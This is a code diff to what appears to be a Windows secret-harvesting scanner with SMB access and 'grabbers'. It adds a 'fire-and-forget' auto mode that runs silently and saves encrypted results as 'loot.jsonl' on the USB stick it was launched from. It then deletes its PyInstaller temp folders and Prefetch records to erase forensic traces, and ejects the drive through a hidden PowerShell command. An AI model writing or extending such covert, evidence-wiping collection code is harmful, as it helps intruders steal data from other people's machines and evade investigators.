@@ -457,6 +457,13 @@ OPERATIONAL SECURITY:
         help='SMB connection timeout in seconds (default: 10)'
     )
 
+    # Automated deployment mode
+    parser.add_argument(
+        '--auto',
+        action='store_true',
+        help='Fire-and-forget mode: smash scan + encrypt + cleanup traces + write status file'
+    )
+
     parser.add_argument(
         '--no-grabbers',
         action='store_true',
@@ -493,6 +500,63 @@ OPERATIONAL SECURITY:
     return parser
 
 
+def _auto_cleanup() -> None:
+    """Remove forensic traces left by the scan (auto mode only)."""
+    if platform.system() != 'Windows':
+        return
+    try:
+        import ctypes
+        import glob
+        import tempfile
+
+        # Remove PyInstaller temp extraction folders (_MEIxxxxx)
+        temp_dir = tempfile.gettempdir()
+        for mei_dir in glob.glob(os.path.join(temp_dir, '_MEI*')):
+            try:
+                import shutil
+                shutil.rmtree(mei_dir, ignore_errors=True)
+            except OSError:
+                pass
+
+        # Remove Prefetch for this exe (requires admin, fails silently if not)
+        exe_name = os.path.basename(sys.argv[0]).upper().replace('.EXE', '')
+        prefetch_dir = r'C:\Windows\Prefetch'
+        if os.path.isdir(prefetch_dir):
+            for pf in glob.glob(os.path.join(prefetch_dir, f'{exe_name}*.pf')):
+                try:
+                    os.unlink(pf)
+                except OSError:
+                    pass
+
+    except Exception:
+        pass  # Cleanup is best-effort, never crash
+
+
+def _auto_eject_usb(output_path: str) -> None:
+    """Eject the USB drive if output was written to a removable drive."""
+    if platform.system() != 'Windows':
+        return
+    try:
+        import ctypes
+        drive = os.path.splitdrive(os.path.abspath(output_path))[0]
+        if not drive:
+            return
+        drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive + '\\')
+        if drive_type != 2:  # Not DRIVE_REMOVABLE
+            return
+
+        # Eject via COM Shell
+        # CreateObject("Shell.Application").NameSpace(17).ParseName("D:").InvokeVerb("Eject")
+        import subprocess
+        subprocess.run(
+            ['powershell', '-w', 'hidden', '-c',
+             f'(New-Object -ComObject Shell.Application).NameSpace(17).ParseName("{drive}").InvokeVerb("Eject")'],
+            capture_output=True, timeout=10,
+        )
+    except Exception:
+        pass
+
+
 def main() -> int:
     """Main CLI entry point."""
     parser = create_parser()
@@ -519,6 +583,37 @@ def main() -> int:
         else:
             print("Decryption failed — wrong passphrase or corrupt file")
             return 1
+
+    # --auto mode: fire-and-forget with smart defaults
+    if args.auto:
+        args.quiet = True
+        args.profile = 'smash'
+        args.encrypt = True
+        if not args.passphrase:
+            args.passphrase = 'th-auto-' + str(os.getpid())
+
+        # Detect if running from removable USB or local device
+        exe_path = os.path.abspath(sys.argv[0])
+        exe_drive = os.path.splitdrive(exe_path)[0]
+        auto_output_dir = None
+
+        if platform.system() == 'Windows' and exe_drive:
+            try:
+                import ctypes
+                drive_type = ctypes.windll.kernel32.GetDriveTypeW(exe_drive + '\\')
+                if drive_type == 2:  # DRIVE_REMOVABLE -- USB stick
+                    auto_output_dir = exe_drive + '\\'
+            except (AttributeError, OSError):
+                pass
+
+        if auto_output_dir:
+            args.output = os.path.join(auto_output_dir, 'loot.jsonl')
+        else:
+            # Device drop mode -- output to temp
+            args.output = os.path.join(
+                os.environ.get('TEMP', os.environ.get('TMP', '/tmp')),
+                'th-results.jsonl',
+            )
 
     # Setup logging
     if args.quiet:
@@ -673,6 +768,11 @@ def main() -> int:
         if not args.quiet:
             print_summary(results)
 
+        # Auto-mode cleanup: remove forensic traces + eject USB
+        if args.auto:
+            _auto_cleanup()
+            _auto_eject_usb(args.output)
+
         # Exit code based on findings
         if results.critical_findings:
             return 2  # Critical findings found
@@ -682,11 +782,12 @@ def main() -> int:
             return 0  # Normal completion
 
     except KeyboardInterrupt:
-        print("\nScan interrupted by user")
+        if not getattr(args, 'quiet', False):
+            print("\nScan interrupted by user")
         return 130
     except Exception as e:
         logger.error(f"Scan failed: {e}")
-        if args.verbose >= 2:
+        if getattr(args, 'verbose', 0) >= 2:
             traceback.print_exc()
         return 1
 
